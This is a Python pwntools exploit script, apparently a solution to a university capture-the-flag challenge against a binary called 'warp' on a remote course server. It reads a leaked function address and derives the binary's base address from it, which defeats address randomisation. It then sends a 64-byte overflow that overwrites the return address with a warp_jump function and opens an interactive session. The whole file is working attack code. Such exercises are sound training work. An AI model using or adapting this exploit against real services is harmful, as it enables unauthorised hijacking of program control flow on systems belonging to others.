from pwn import *

# Set up the binary context for Pwntools
context.binary = ELF('./warp')  # Load the binary file to analyze
context.log_level = 'debug'    # Set logging level to debug for detailed output

# Remote target details
host = "cs4401shell2.walls.ninja"  # Remote server hostname
port = 14180                      # Remote server port

# Start a remote connection to the target
p = remote(host, port)

# Receive initial output until the hint function address is mentioned
output = p.recvuntil(b"Hint function at ")
leak = p.recvline().strip()  # Read the leaked address from the output

# Extract the leaked address from the received data
leaked_addr = int(leak.split(b"0x")[1].split(b")")[0], 16)  # Convert to integer
base_addr = leaked_addr - 0x13C0  # Calculate the base address of the binary
warp_jump_offset = 0x12BF         # Offset to the warp_jump function
warp_jump_addr = base_addr + warp_jump_offset  # Calculate the warp_jump address

# Log the extracted and calculated addresses for debugging
log.info(f"Leaked address: {hex(leaked_addr)}")
log.info(f"Calculated base address: {hex(base_addr)}")
log.info(f"Calculated warp_jump address: {hex(warp_jump_addr)}")

# Construct the payload to exploit the vulnerability
padding = b"A" * 64  # Buffer overflow padding (adjusted based on offset discovery)
overwrite_return = p64(warp_jump_addr)  # Overwrite return address with warp_jump
payload = padding + overwrite_return    # Final payload combining padding and address

# Send the payload to the target
p.sendline(payload)

# Switch to interactive mode to interact with the exploited process
p.interactive()
